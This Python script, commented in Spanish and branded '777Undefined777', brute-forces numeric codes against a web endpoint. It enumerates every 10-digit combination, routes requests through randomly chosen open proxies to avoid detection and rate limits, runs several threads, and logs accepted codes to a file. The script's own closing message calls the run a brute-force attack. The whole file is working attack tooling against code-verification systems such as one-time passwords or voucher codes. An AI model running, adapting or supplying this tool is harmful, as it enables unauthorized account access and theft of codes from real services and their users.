import itertools
import requests
import threading
import random
import queue

def print_centered(text, width=90):
    
    print(text.center(width, '#'))

# Configuración del ancho de la consola
console_width = 30

# Encabezado
print_centered("#############################", console_width)
print_centered("#  🚫  777Undefined777 🚫  #", console_width)
print_centered("#############################", console_width)
print()

url = "https://wwww.ejemplo.com/endopint"  # URL de destino

session = requests.Session()

proxies = [
    {"http": "http://161.34.40.34:3128"},
    {"http": "http://84.255.197.228:83"},
]

code_queue = queue.Queue()


info_logged = False
response_info = {}

def check_code(code):
    global info_logged, response_info

    try:
        data = {"code": code}
        proxy = random.choice(proxies) if proxies else None
        response = session.post(url, data=data, proxies=proxy, timeout=10)

        # Almacenar la información de la respuesta si no se ha hecho antes
        if not info_logged:
            response_info = {
                "status_code": response.status_code,
                "headers": response.headers,
                "text": response.text[:1000]  #muestra los 1000 primeros caractrews del txto
            }
            info_logged = True
            print("\nInformación de depuración:")
            print(f"Estado de la respuesta: {response_info['status_code']}")
            print(f"Encabezados de la respuesta: {response_info['headers']}")
            print(f"Contenido de la respuesta (primeros 1000 caracteres): {response_info['text']}\n")
        
        if response.status_code == 200:
            if "Código válido" in response.text:
                print(f"🎉 ¡Código exitoso encontrado: {code}!")
                with open("codigosvalidos.txt", "a") as file:
                    file.write(code + "\n")
            else:
                print(f"🚫 Código {code} no válido.")
        else:
            print(f"⚠️ Respuesta no exitosa para el código {code}. Código de estado: {response.status_code}")
    except requests.RequestException as e:
        print(f"❗ Error al enviar solicitud para el código {code}: {e}")

def generate_codes(length):
    digits = "0123456789"
    for code in itertools.product(digits, repeat=length):
        code_queue.put(''.join(code))

def worker():
    while not code_queue.empty():
        code = code_queue.get()
        print(f"🔍 Intentando código: {code}")
        check_code(code)

def brute_force_attack(length, thread_count=4):
    threading.Thread(target=generate_codes, args=(length,)).start()

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("\n🔚 El ataque de fuerza bruta ha terminado.")

brute_force_attack(10)
